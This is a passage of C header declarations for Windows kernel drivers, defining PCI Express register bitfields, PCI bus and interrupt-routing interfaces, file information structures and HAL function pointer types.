      ULONG ShpcNativeHotPlug:1;
      ULONG ExpressNativePME:1;
      ULONG ExpressAdvancedErrorReporting:1;
      ULONG ExpressCapabilityStructure:1;
      ULONG Reserved:27;
    } DUMMYSTRUCTNAME;
  ULONG AsULONG;
  } u;
} PCI_ROOT_BUS_OSC_CONTROL_FIELD, *PPCI_ROOT_BUS_OSC_CONTROL_FIELD;

typedef enum _PCI_HARDWARE_INTERFACE {
  PciConventional,
  PciXMode1,
  PciXMode2,
  PciExpress
} PCI_HARDWARE_INTERFACE, *PPCI_HARDWARE_INTERFACE;

typedef enum {
  BusWidth32Bits,
  BusWidth64Bits
} PCI_BUS_WIDTH;

typedef struct _PCI_ROOT_BUS_HARDWARE_CAPABILITY {
  PCI_HARDWARE_INTERFACE SecondaryInterface;
  _ANONYMOUS_STRUCT struct {
    BOOLEAN BusCapabilitiesFound;
    ULONG CurrentSpeedAndMode;
    ULONG SupportedSpeedsAndModes;
    BOOLEAN DeviceIDMessagingCapable;
    PCI_BUS_WIDTH SecondaryBusWidth;
  } DUMMYSTRUCTNAME;
  PCI_ROOT_BUS_OSC_SUPPORT_FIELD OscFeatureSupport;
  PCI_ROOT_BUS_OSC_CONTROL_FIELD OscControlRequest;
  PCI_ROOT_BUS_OSC_CONTROL_FIELD OscControlGranted;
} PCI_ROOT_BUS_HARDWARE_CAPABILITY, *PPCI_ROOT_BUS_HARDWARE_CAPABILITY;

typedef union _PCI_EXPRESS_CAPABILITIES_REGISTER {
  _ANONYMOUS_STRUCT struct {
    USHORT CapabilityVersion:4;
    USHORT DeviceType:4;
    USHORT SlotImplemented:1;
    USHORT InterruptMessageNumber:5;
    USHORT Rsvd:2;
  } DUMMYSTRUCTNAME;
  USHORT AsUSHORT;
} PCI_EXPRESS_CAPABILITIES_REGISTER, *PPCI_EXPRESS_CAPABILITIES_REGISTER;

typedef union _PCI_EXPRESS_DEVICE_CAPABILITIES_REGISTER {
  _ANONYMOUS_STRUCT struct {
    ULONG MaxPayloadSizeSupported:3;
    ULONG PhantomFunctionsSupported:2;
    ULONG ExtendedTagSupported:1;
    ULONG L0sAcceptableLatency:3;
    ULONG L1AcceptableLatency:3;
    ULONG Undefined:3;
    ULONG RoleBasedErrorReporting:1;
    ULONG Rsvd1:2;
    ULONG CapturedSlotPowerLimit:8;
    ULONG CapturedSlotPowerLimitScale:2;
    ULONG Rsvd2:4;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_DEVICE_CAPABILITIES_REGISTER, *PPCI_EXPRESS_DEVICE_CAPABILITIES_REGISTER;

#define PCI_EXPRESS_AER_DEVICE_CONTROL_MASK 0x07;

typedef union _PCI_EXPRESS_DEVICE_CONTROL_REGISTER {
  _ANONYMOUS_STRUCT struct {
    USHORT CorrectableErrorEnable:1;
    USHORT NonFatalErrorEnable:1;
    USHORT FatalErrorEnable:1;
    USHORT UnsupportedRequestErrorEnable:1;
    USHORT EnableRelaxedOrder:1;
    USHORT MaxPayloadSize:3;
    USHORT ExtendedTagEnable:1;
    USHORT PhantomFunctionsEnable:1;
    USHORT AuxPowerEnable:1;
    USHORT NoSnoopEnable:1;
    USHORT MaxReadRequestSize:3;
    USHORT BridgeConfigRetryEnable:1;
  } DUMMYSTRUCTNAME;
  USHORT AsUSHORT;
} PCI_EXPRESS_DEVICE_CONTROL_REGISTER, *PPCI_EXPRESS_DEVICE_CONTROL_REGISTER;

#define PCI_EXPRESS_AER_DEVICE_STATUS_MASK 0x0F;

typedef union _PCI_EXPRESS_DEVICE_STATUS_REGISTER {
  _ANONYMOUS_STRUCT struct {
    USHORT CorrectableErrorDetected:1;
    USHORT NonFatalErrorDetected:1;
    USHORT FatalErrorDetected:1;
    USHORT UnsupportedRequestDetected:1;
    USHORT AuxPowerDetected:1;
    USHORT TransactionsPending:1;
    USHORT Rsvd:10;
  } DUMMYSTRUCTNAME;
  USHORT AsUSHORT;
} PCI_EXPRESS_DEVICE_STATUS_REGISTER, *PPCI_EXPRESS_DEVICE_STATUS_REGISTER;

typedef union _PCI_EXPRESS_LINK_CAPABILITIES_REGISTER {
  _ANONYMOUS_STRUCT struct {
    ULONG MaximumLinkSpeed:4;
    ULONG MaximumLinkWidth:6;
    ULONG ActiveStatePMSupport:2;
    ULONG L0sExitLatency:3;
    ULONG L1ExitLatency:3;
    ULONG ClockPowerManagement:1;
    ULONG SurpriseDownErrorReportingCapable:1;
    ULONG DataLinkLayerActiveReportingCapable:1;
    ULONG Rsvd:3;
    ULONG PortNumber:8;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_LINK_CAPABILITIES_REGISTER, *PPCI_EXPRESS_LINK_CAPABILITIES_REGISTER;

typedef union _PCI_EXPRESS_LINK_CONTROL_REGISTER {
  _ANONYMOUS_STRUCT struct {
    USHORT ActiveStatePMControl:2;
    USHORT Rsvd1:1;
    USHORT ReadCompletionBoundary:1;
    USHORT LinkDisable:1;
    USHORT RetrainLink:1;
    USHORT CommonClockConfig:1;
    USHORT ExtendedSynch:1;
    USHORT EnableClockPowerManagement:1;
    USHORT Rsvd2:7;
  } DUMMYSTRUCTNAME;
  USHORT AsUSHORT;
} PCI_EXPRESS_LINK_CONTROL_REGISTER, *PPCI_EXPRESS_LINK_CONTROL_REGISTER;

typedef union _PCI_EXPRESS_LINK_STATUS_REGISTER {
  _ANONYMOUS_STRUCT struct {
    USHORT LinkSpeed:4;
    USHORT LinkWidth:6;
    USHORT Undefined:1;
    USHORT LinkTraining:1;
    USHORT SlotClockConfig:1;
    USHORT DataLinkLayerActive:1;
    USHORT Rsvd:2;
  } DUMMYSTRUCTNAME;
  USHORT AsUSHORT;
} PCI_EXPRESS_LINK_STATUS_REGISTER, *PPCI_EXPRESS_LINK_STATUS_REGISTER;

typedef union _PCI_EXPRESS_SLOT_CAPABILITIES_REGISTER {
  _ANONYMOUS_STRUCT struct {
    ULONG AttentionButtonPresent:1;
    ULONG PowerControllerPresent:1;
    ULONG MRLSensorPresent:1;
    ULONG AttentionIndicatorPresent:1;
    ULONG PowerIndicatorPresent:1;
    ULONG HotPlugSurprise:1;
    ULONG HotPlugCapable:1;
    ULONG SlotPowerLimit:8;
    ULONG SlotPowerLimitScale:2;
    ULONG ElectromechanicalLockPresent:1;
    ULONG NoCommandCompletedSupport:1;
    ULONG PhysicalSlotNumber:13;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_SLOT_CAPABILITIES_REGISTER, *PPCI_EXPRESS_SLOT_CAPABILITIES_REGISTER;

typedef union _PCI_EXPRESS_SLOT_CONTROL_REGISTER {
  _ANONYMOUS_STRUCT struct {
    USHORT AttentionButtonEnable:1;
    USHORT PowerFaultDetectEnable:1;
    USHORT MRLSensorEnable:1;
    USHORT PresenceDetectEnable:1;
    USHORT CommandCompletedEnable:1;
    USHORT HotPlugInterruptEnable:1;
    USHORT AttentionIndicatorControl:2;
    USHORT PowerIndicatorControl:2;
    USHORT PowerControllerControl:1;
    USHORT ElectromechanicalLockControl:1;
    USHORT DataLinkStateChangeEnable:1;
    USHORT Rsvd:3;
  } DUMMYSTRUCTNAME;
  USHORT AsUSHORT;
} PCI_EXPRESS_SLOT_CONTROL_REGISTER, *PPCI_EXPRESS_SLOT_CONTROL_REGISTER;

typedef union _PCI_EXPRESS_SLOT_STATUS_REGISTER {
  _ANONYMOUS_STRUCT struct {
    USHORT AttentionButtonPressed:1;
    USHORT PowerFaultDetected:1;
    USHORT MRLSensorChanged:1;
    USHORT PresenceDetectChanged:1;
    USHORT CommandCompleted:1;
    USHORT MRLSensorState:1;
    USHORT PresenceDetectState:1;
    USHORT ElectromechanicalLockEngaged:1;
    USHORT DataLinkStateChanged:1;
    USHORT Rsvd:7;
  } DUMMYSTRUCTNAME;
  USHORT AsUSHORT;
} PCI_EXPRESS_SLOT_STATUS_REGISTER, *PPCI_EXPRESS_SLOT_STATUS_REGISTER;

typedef union _PCI_EXPRESS_ROOT_CONTROL_REGISTER {
  _ANONYMOUS_STRUCT struct {
    USHORT CorrectableSerrEnable:1;
    USHORT NonFatalSerrEnable:1;
    USHORT FatalSerrEnable:1;
    USHORT PMEInterruptEnable:1;
    USHORT CRSSoftwareVisibilityEnable:1;
    USHORT Rsvd:11;
  } DUMMYSTRUCTNAME;
  USHORT AsUSHORT;
} PCI_EXPRESS_ROOT_CONTROL_REGISTER, *PPCI_EXPRESS_ROOT_CONTROL_REGISTER;

typedef union _PCI_EXPRESS_ROOT_CAPABILITIES_REGISTER {
  _ANONYMOUS_STRUCT struct {
    USHORT CRSSoftwareVisibility:1;
    USHORT Rsvd:15;
  } DUMMYSTRUCTNAME;
  USHORT AsUSHORT;
} PCI_EXPRESS_ROOT_CAPABILITIES_REGISTER, *PPCI_EXPRESS_ROOT_CAPABILITIES_REGISTER;

typedef union _PCI_EXPRESS_ROOT_STATUS_REGISTER {
  _ANONYMOUS_STRUCT struct {
    ULONG PMERequestorId:16;
    ULONG PMEStatus:1;
    ULONG PMEPending:1;
    ULONG Rsvd:14;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_ROOT_STATUS_REGISTER, *PPCI_EXPRESS_ROOT_STATUS_REGISTER;

typedef struct _PCI_EXPRESS_CAPABILITY {
  PCI_CAPABILITIES_HEADER Header;
  PCI_EXPRESS_CAPABILITIES_REGISTER ExpressCapabilities;
  PCI_EXPRESS_DEVICE_CAPABILITIES_REGISTER DeviceCapabilities;
  PCI_EXPRESS_DEVICE_CONTROL_REGISTER DeviceControl;
  PCI_EXPRESS_DEVICE_STATUS_REGISTER DeviceStatus;
  PCI_EXPRESS_LINK_CAPABILITIES_REGISTER LinkCapabilities;
  PCI_EXPRESS_LINK_CONTROL_REGISTER LinkControl;
  PCI_EXPRESS_LINK_STATUS_REGISTER LinkStatus;
  PCI_EXPRESS_SLOT_CAPABILITIES_REGISTER SlotCapabilities;
  PCI_EXPRESS_SLOT_CONTROL_REGISTER SlotControl;
  PCI_EXPRESS_SLOT_STATUS_REGISTER SlotStatus;
  PCI_EXPRESS_ROOT_CONTROL_REGISTER RootControl;
  PCI_EXPRESS_ROOT_CAPABILITIES_REGISTER RootCapabilities;
  PCI_EXPRESS_ROOT_STATUS_REGISTER RootStatus;
} PCI_EXPRESS_CAPABILITY, *PPCI_EXPRESS_CAPABILITY;

typedef enum {
  MRLClosed = 0,
  MRLOpen
} PCI_EXPRESS_MRL_STATE;

typedef enum {
  SlotEmpty = 0,
  CardPresent
} PCI_EXPRESS_CARD_PRESENCE;

typedef enum {
  IndicatorOn = 1,
  IndicatorBlink,
  IndicatorOff
} PCI_EXPRESS_INDICATOR_STATE;

typedef enum {
  PowerOn = 0,
  PowerOff
} PCI_EXPRESS_POWER_STATE;

typedef enum {
  L0sEntrySupport = 1,
  L0sAndL1EntrySupport = 3
} PCI_EXPRESS_ASPM_SUPPORT;

typedef enum {
  L0sAndL1EntryDisabled,
  L0sEntryEnabled,
  L1EntryEnabled,
  L0sAndL1EntryEnabled
} PCI_EXPRESS_ASPM_CONTROL;

typedef enum {
  L0s_Below64ns = 0,
  L0s_64ns_128ns,
  L0s_128ns_256ns,
  L0s_256ns_512ns,
  L0s_512ns_1us,
  L0s_1us_2us,
  L0s_2us_4us,
  L0s_Above4us
} PCI_EXPRESS_L0s_EXIT_LATENCY;

typedef enum {
  L1_Below1us = 0,
  L1_1us_2us,
  L1_2us_4us,
  L1_4us_8us,
  L1_8us_16us,
  L1_16us_32us,
  L1_32us_64us,
  L1_Above64us
} PCI_EXPRESS_L1_EXIT_LATENCY;

typedef enum {
  PciExpressEndpoint = 0,
  PciExpressLegacyEndpoint,
  PciExpressRootPort = 4,
  PciExpressUpstreamSwitchPort,
  PciExpressDownstreamSwitchPort,
  PciExpressToPciXBridge,
  PciXToExpressBridge,
  PciExpressRootComplexIntegratedEndpoint,
  PciExpressRootComplexEventCollector
} PCI_EXPRESS_DEVICE_TYPE;

typedef enum {
  MaxPayload128Bytes = 0,
  MaxPayload256Bytes,
  MaxPayload512Bytes,
  MaxPayload1024Bytes,
  MaxPayload2048Bytes,
  MaxPayload4096Bytes
} PCI_EXPRESS_MAX_PAYLOAD_SIZE;

typedef union _PCI_EXPRESS_PME_REQUESTOR_ID {
  _ANONYMOUS_STRUCT struct {
    USHORT FunctionNumber:3;
    USHORT DeviceNumber:5;
    USHORT BusNumber:8;
  } DUMMYSTRUCTNAME;
  USHORT AsUSHORT;
} PCI_EXPRESS_PME_REQUESTOR_ID, *PPCI_EXPRESS_PME_REQUESTOR_ID;

typedef enum _PHYSICAL_COUNTER_RESOURCE_DESCRIPTOR_TYPE {
  ResourceTypeSingle = 0,
  ResourceTypeRange,
  ResourceTypeExtendedCounterConfiguration,
  ResourceTypeOverflow,
  ResourceTypeMax
} PHYSICAL_COUNTER_RESOURCE_DESCRIPTOR_TYPE;

typedef struct _PHYSICAL_COUNTER_RESOURCE_DESCRIPTOR {
  PHYSICAL_COUNTER_RESOURCE_DESCRIPTOR_TYPE Type;
  ULONG Flags;
  union {
    ULONG CounterIndex;
    ULONG ExtendedRegisterAddress;
    struct {
      ULONG Begin;
      ULONG End;
    } Range;
  } u;
} PHYSICAL_COUNTER_RESOURCE_DESCRIPTOR, *PPHYSICAL_COUNTER_RESOURCE_DESCRIPTOR;

typedef struct _PHYSICAL_COUNTER_RESOURCE_LIST {
  ULONG Count;
  PHYSICAL_COUNTER_RESOURCE_DESCRIPTOR Descriptors[ANYSIZE_ARRAY];
} PHYSICAL_COUNTER_RESOURCE_LIST, *PPHYSICAL_COUNTER_RESOURCE_LIST;

typedef VOID
(NTAPI *PciPin2Line)(
  IN struct _BUS_HANDLER *BusHandler,
  IN struct _BUS_HANDLER *RootHandler,
  IN PCI_SLOT_NUMBER SlotNumber,
  IN PPCI_COMMON_CONFIG PciData);

typedef VOID
(NTAPI *PciLine2Pin)(
  IN struct _BUS_HANDLER *BusHandler,
  IN struct _BUS_HANDLER *RootHandler,
  IN PCI_SLOT_NUMBER SlotNumber,
  IN PPCI_COMMON_CONFIG PciNewData,
  IN PPCI_COMMON_CONFIG PciOldData);

typedef VOID
(NTAPI *PciReadWriteConfig)(
  IN struct _BUS_HANDLER *BusHandler,
  IN PCI_SLOT_NUMBER Slot,
  IN PVOID Buffer,
  IN ULONG Offset,
  IN ULONG Length);

#define PCI_DATA_TAG ' ICP'
#define PCI_DATA_VERSION 1

typedef struct _PCIBUSDATA {
  ULONG Tag;
  ULONG Version;
  PciReadWriteConfig ReadConfig;
  PciReadWriteConfig WriteConfig;
  PciPin2Line Pin2Line;
  PciLine2Pin Line2Pin;
  PCI_SLOT_NUMBER ParentSlot;
  PVOID Reserved[4];
} PCIBUSDATA, *PPCIBUSDATA;

#ifndef _PCIINTRF_X_
#define _PCIINTRF_X_

typedef ULONG
(NTAPI *PCI_READ_WRITE_CONFIG)(
  IN PVOID Context,
  IN ULONG BusOffset,
  IN ULONG Slot,
  IN PVOID Buffer,
  IN ULONG Offset,
  IN ULONG Length);

typedef VOID
(NTAPI *PCI_PIN_TO_LINE)(
  IN PVOID Context,
  IN PPCI_COMMON_CONFIG PciData);

typedef VOID
(NTAPI *PCI_LINE_TO_PIN)(
  IN PVOID Context,
  IN PPCI_COMMON_CONFIG PciNewData,
  IN PPCI_COMMON_CONFIG PciOldData);

typedef VOID
(NTAPI *PCI_ROOT_BUS_CAPABILITY)(
  IN PVOID Context,
  OUT PPCI_ROOT_BUS_HARDWARE_CAPABILITY HardwareCapability);

typedef VOID
(NTAPI *PCI_EXPRESS_WAKE_CONTROL)(
  IN PVOID Context,
  IN BOOLEAN EnableWake);

typedef struct _PCI_BUS_INTERFACE_STANDARD {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PCI_READ_WRITE_CONFIG ReadConfig;
  PCI_READ_WRITE_CONFIG WriteConfig;
  PCI_PIN_TO_LINE PinToLine;
  PCI_LINE_TO_PIN LineToPin;
  PCI_ROOT_BUS_CAPABILITY RootBusCapability;
  PCI_EXPRESS_WAKE_CONTROL ExpressWakeControl;
} PCI_BUS_INTERFACE_STANDARD, *PPCI_BUS_INTERFACE_STANDARD;

#define PCI_BUS_INTERFACE_STANDARD_VERSION 1

#endif /* _PCIINTRF_X_ */

#if (NTDDI_VERSION >= NTDDI_WIN7)

#define FILE_CHARACTERISTICS_EXPECT_ORDERLY_REMOVAL_EX     0x00004000
#define FILE_CHARACTERISTICS_EXPECT_SURPRISE_REMOVAL_EX    0x00008000
#define FILE_CHARACTERISTICS_REMOVAL_POLICY_MASK_EX \
  (FILE_CHARACTERISTICS_EXPECT_ORDERLY_REMOVAL_EX | \
   FILE_CHARACTERISTICS_EXPECT_SURPRISE_REMOVAL_EX)

#define FILE_CHARACTERISTICS_EXPECT_ORDERLY_REMOVAL_DEPRECATED 0x00000200
#define FILE_CHARACTERISTICS_EXPECT_SURPRISE_REMOVAL_DEPRECATED 0x00000300
#define FILE_CHARACTERISTICS_REMOVAL_POLICY_MASK_DEPRECATED 0x00000300

#else

#define FILE_CHARACTERISTICS_EXPECT_ORDERLY_REMOVAL     0x00000200
#define FILE_CHARACTERISTICS_EXPECT_SURPRISE_REMOVAL    0x00000300
#define FILE_CHARACTERISTICS_REMOVAL_POLICY_MASK        0x00000300

#define FILE_CHARACTERISTICS_EXPECT_ORDERLY_REMOVAL_EX FILE_CHARACTERISTICS_EXPECT_ORDERLY_REMOVAL
#define FILE_CHARACTERISTICS_EXPECT_SURPRISE_REMOVAL_EX FILE_CHARACTERISTICS_EXPECT_SURPRISE_REMOVAL
#define FILE_CHARACTERISTICS_REMOVAL_POLICY_MASK_EX FILE_CHARACTERISTICS_REMOVAL_POLICY_MASK

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

#define FILE_CHARACTERISTICS_PROPAGATED (FILE_REMOVABLE_MEDIA  | \
                                         FILE_READ_ONLY_DEVICE | \
                                         FILE_FLOPPY_DISKETTE  | \
                                         FILE_WRITE_ONCE_MEDIA | \
                                         FILE_DEVICE_SECURE_OPEN)

typedef struct _FILE_ALIGNMENT_INFORMATION {
  ULONG AlignmentRequirement;
} FILE_ALIGNMENT_INFORMATION, *PFILE_ALIGNMENT_INFORMATION;

typedef struct _FILE_NAME_INFORMATION {
  ULONG FileNameLength;
  WCHAR FileName[1];
} FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;


typedef struct _FILE_ATTRIBUTE_TAG_INFORMATION {
  ULONG FileAttributes;
  ULONG ReparseTag;
} FILE_ATTRIBUTE_TAG_INFORMATION, *PFILE_ATTRIBUTE_TAG_INFORMATION;

typedef struct _FILE_DISPOSITION_INFORMATION {
  BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;

typedef struct _FILE_END_OF_FILE_INFORMATION {
  LARGE_INTEGER EndOfFile;
} FILE_END_OF_FILE_INFORMATION, *PFILE_END_OF_FILE_INFORMATION;

typedef struct _FILE_VALID_DATA_LENGTH_INFORMATION {
  LARGE_INTEGER ValidDataLength;
} FILE_VALID_DATA_LENGTH_INFORMATION, *PFILE_VALID_DATA_LENGTH_INFORMATION;

typedef struct _FILE_FS_LABEL_INFORMATION {
  ULONG VolumeLabelLength;
  WCHAR VolumeLabel[1];
} FILE_FS_LABEL_INFORMATION, *PFILE_FS_LABEL_INFORMATION;

typedef struct _FILE_FS_VOLUME_INFORMATION {
  LARGE_INTEGER VolumeCreationTime;
  ULONG VolumeSerialNumber;
  ULONG VolumeLabelLength;
  BOOLEAN SupportsObjects;
  WCHAR VolumeLabel[1];
} FILE_FS_VOLUME_INFORMATION, *PFILE_FS_VOLUME_INFORMATION;

typedef struct _FILE_FS_SIZE_INFORMATION {
  LARGE_INTEGER TotalAllocationUnits;
  LARGE_INTEGER AvailableAllocationUnits;
  ULONG SectorsPerAllocationUnit;
  ULONG BytesPerSector;
} FILE_FS_SIZE_INFORMATION, *PFILE_FS_SIZE_INFORMATION;

typedef struct _FILE_FS_FULL_SIZE_INFORMATION {
  LARGE_INTEGER TotalAllocationUnits;
  LARGE_INTEGER CallerAvailableAllocationUnits;
  LARGE_INTEGER ActualAvailableAllocationUnits;
  ULONG SectorsPerAllocationUnit;
  ULONG BytesPerSector;
} FILE_FS_FULL_SIZE_INFORMATION, *PFILE_FS_FULL_SIZE_INFORMATION;

typedef struct _FILE_FS_OBJECTID_INFORMATION {
  UCHAR ObjectId[16];
  UCHAR ExtendedInfo[48];
} FILE_FS_OBJECTID_INFORMATION, *PFILE_FS_OBJECTID_INFORMATION;

typedef union _FILE_SEGMENT_ELEMENT {
  PVOID64 Buffer;
  ULONGLONG Alignment;
}FILE_SEGMENT_ELEMENT, *PFILE_SEGMENT_ELEMENT;

#define IOCTL_AVIO_ALLOCATE_STREAM      CTL_CODE(FILE_DEVICE_AVIO, 1, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IOCTL_AVIO_FREE_STREAM          CTL_CODE(FILE_DEVICE_AVIO, 2, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IOCTL_AVIO_MODIFY_STREAM        CTL_CODE(FILE_DEVICE_AVIO, 3, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

typedef enum _BUS_DATA_TYPE {
  ConfigurationSpaceUndefined = -1,
  Cmos,
  EisaConfiguration,
  Pos,
  CbusConfiguration,
  PCIConfiguration,
  VMEConfiguration,
  NuBusConfiguration,
  PCMCIAConfiguration,
  MPIConfiguration,
  MPSAConfiguration,
  PNPISAConfiguration,
  SgiInternalConfiguration,
  MaximumBusDataType
} BUS_DATA_TYPE, *PBUS_DATA_TYPE;

/* Some Server 2003 DDK definitions */
#define PCI_INT_ROUTE_INTRF_STANDARD_VER 1

typedef NTSTATUS
(NTAPI *PLEGACY_DEVICE_DETECTION_HANDLER)(
  IN PVOID Context,
  IN INTERFACE_TYPE LegacyBusType,
  IN ULONG BusNumber,
  IN ULONG SlotNumber,
  OUT PDEVICE_OBJECT *PhysicalDeviceObject);

typedef struct _ROUTING_TOKEN {
  PVOID LinkNode;
  ULONG StaticVector;
  UCHAR Flags;
} ROUTING_TOKEN, *PROUTING_TOKEN;

typedef NTSTATUS
(NTAPI *PGET_INTERRUPT_ROUTING)(
  IN PDEVICE_OBJECT Pdo,
  OUT ULONG *Bus,
  OUT ULONG *PciSlot,
  OUT UCHAR *InterruptLine,
  OUT UCHAR *InterruptPin,
  OUT UCHAR *ClassCode,
  OUT UCHAR *SubClassCode,
  OUT PDEVICE_OBJECT *ParentPdo,
  OUT ROUTING_TOKEN *RoutingToken,
  OUT UCHAR *Flags);

typedef NTSTATUS
(NTAPI *PSET_INTERRUPT_ROUTING_TOKEN)(
  IN PDEVICE_OBJECT Pdo,
  IN PROUTING_TOKEN RoutingToken);

typedef VOID
(NTAPI *PUPDATE_INTERRUPT_LINE)(
  IN PDEVICE_OBJECT Pdo,
  IN UCHAR LineRegister);

typedef struct _INT_ROUTE_INTERFACE_STANDARD {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PGET_INTERRUPT_ROUTING GetInterruptRouting;
  PSET_INTERRUPT_ROUTING_TOKEN SetInterruptRoutingToken;
  PUPDATE_INTERRUPT_LINE UpdateInterruptLine;
} INT_ROUTE_INTERFACE_STANDARD, *PINT_ROUTE_INTERFACE_STANDARD;

typedef struct _LEGACY_DEVICE_DETECTION_INTERFACE {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PLEGACY_DEVICE_DETECTION_HANDLER LegacyDeviceDetection;
} LEGACY_DEVICE_DETECTION_INTERFACE, *PLEGACY_DEVICE_DETECTION_INTERFACE;

/* FIXME : These definitions don't exist in public headers */

#define PCI_CB_INTRF_VERSION             1
#define PCI_PME_INTRF_STANDARD_VER       1
#define PNP_LOCATION_INTERFACE_VERSION   1

DEFINE_GUID(GUID_PCI_CARDBUS_INTERFACE_PRIVATE, 0xcca82f31, 0x54d6, 0x11d1, 0x82, 0x24, 0x00, 0xa0, 0xc9, 0x32, 0x43, 0x85);
DEFINE_GUID(GUID_PCI_PME_INTERFACE, 0xaac7e6ac, 0xbb0b, 0x11d2, 0xb4, 0x84, 0x00, 0xc0, 0x4f, 0x72, 0xde, 0x8b);

typedef NTSTATUS
(NTAPI *PCARDBUSADD)(
  IN PDEVICE_OBJECT DeviceObject,
  IN OUT PVOID *DeviceContext);

typedef NTSTATUS
(NTAPI *PCARDBUSDELETE)(
  IN PVOID DeviceContext);

typedef NTSTATUS
(NTAPI *PCARDBUSPCIDISPATCH)(
  IN PVOID DeviceContext,
  IN PIRP Irp);

typedef VOID
(NTAPI *PPME_SET_PME_ENABLE)(
  IN PDEVICE_OBJECT Pdo,
  IN BOOLEAN PmeEnable);

typedef VOID
(NTAPI *PPME_CLEAR_PME_STATUS)(
  IN PDEVICE_OBJECT Pdo);

typedef VOID
(NTAPI *PPME_GET_INFORMATION)(
  IN PDEVICE_OBJECT Pdo,
  OUT PBOOLEAN PmeCapable,
  OUT PBOOLEAN PmeStatus,
  OUT PBOOLEAN PmeEnable);

typedef struct _PCI_CARDBUS_INTERFACE_PRIVATE {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PDRIVER_OBJECT DriverObject;
  PCARDBUSADD AddCardBus;
  PCARDBUSDELETE DeleteCardBus;
  PCARDBUSPCIDISPATCH DispatchPnp;
} PCI_CARDBUS_INTERFACE_PRIVATE, *PPCI_CARDBUS_INTERFACE_PRIVATE;

typedef struct _PCI_PME_INTERFACE {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PPME_GET_INFORMATION GetPmeInformation;
  PPME_CLEAR_PME_STATUS ClearPmeStatus;
  PPME_SET_PME_ENABLE UpdateEnable;
} PCI_PME_INTERFACE, *PPCI_PME_INTERFACE;

/* Hardware Abstraction Layer Types */

typedef BOOLEAN
(NTAPI *PHAL_RESET_DISPLAY_PARAMETERS)(
  IN ULONG Columns,
  IN ULONG Rows);

typedef PBUS_HANDLER
(FASTCALL *pHalHandlerForBus)(
  IN INTERFACE_TYPE InterfaceType,
  IN ULONG BusNumber);

typedef VOID
(FASTCALL *pHalReferenceBusHandler)(
  IN PBUS_HANDLER BusHandler);

typedef enum _HAL_QUERY_INFORMATION_CLASS {
  HalInstalledBusInformation,
  HalProfileSourceInformation,
  HalInformationClassUnused1,
  HalPowerInformation,
  HalProcessorSpeedInformation,
  HalCallbackInformation,
  HalMapRegisterInformation,
  HalMcaLogInformation,
  HalFrameBufferCachingInformation,
  HalDisplayBiosInformation,
  HalProcessorFeatureInformation,
  HalNumaTopologyInterface,
  HalErrorInformation,
  HalCmcLogInformation,
  HalCpeLogInformation,
  HalQueryMcaInterface,
  HalQueryAMLIIllegalIOPortAddresses,
  HalQueryMaxHotPlugMemoryAddress,
  HalPartitionIpiInterface,
  HalPlatformInformation,
  HalQueryProfileSourceList,
  HalInitLogInformation,
  HalFrequencyInformation,
  HalProcessorBrandString,
  HalHypervisorInformation,
  HalPlatformTimerInformation,
  HalAcpiAuditInformation
} HAL_QUERY_INFORMATION_CLASS, *PHAL_QUERY_INFORMATION_CLASS;

typedef enum _HAL_SET_INFORMATION_CLASS {
  HalProfileSourceInterval,
  HalProfileSourceInterruptHandler,
  HalMcaRegisterDriver,
  HalKernelErrorHandler,
  HalCmcRegisterDriver,
  HalCpeRegisterDriver,
  HalMcaLog,
  HalCmcLog,
  HalCpeLog,
  HalGenerateCmcInterrupt,
  HalProfileSourceTimerHandler,
  HalEnlightenment,
  HalProfileDpgoSourceInterruptHandler
} HAL_SET_INFORMATION_CLASS, *PHAL_SET_INFORMATION_CLASS;

typedef NTSTATUS
(NTAPI *pHalQuerySystemInformation)(
  IN HAL_QUERY_INFORMATION_CLASS InformationClass,
  IN ULONG BufferSize,
  IN OUT PVOID Buffer,
  OUT PULONG ReturnedLength);

typedef NTSTATUS
(NTAPI *pHalSetSystemInformation)(
  IN HAL_SET_INFORMATION_CLASS InformationClass,
  IN ULONG BufferSize,
  IN PVOID Buffer);

typedef VOID
(FASTCALL *pHalExamineMBR)(
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG SectorSize,
  IN ULONG MBRTypeIdentifier,
  OUT PVOID *Buffer);

typedef NTSTATUS
(FASTCALL *pHalIoReadPartitionTable)(
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG SectorSize,
  IN BOOLEAN ReturnRecognizedPartitions,
  OUT struct _DRIVE_LAYOUT_INFORMATION **PartitionBuffer);

typedef NTSTATUS
(FASTCALL *pHalIoSetPartitionInformation)(
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG SectorSize,
  IN ULONG PartitionNumber,
  IN ULONG PartitionType);

typedef NTSTATUS
(FASTCALL *pHalIoWritePartitionTable)(
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG SectorSize,
  IN ULONG SectorsPerTrack,
  IN ULONG NumberOfHeads,
  IN struct _DRIVE_LAYOUT_INFORMATION *PartitionBuffer);

typedef NTSTATUS
(NTAPI *pHalQueryBusSlots)(
  IN PBUS_HANDLER BusHandler,
  IN ULONG BufferSize,
  OUT PULONG SlotNumbers,
  OUT PULONG ReturnedLength);

typedef NTSTATUS
(NTAPI *pHalInitPnpDriver)(
  VOID);
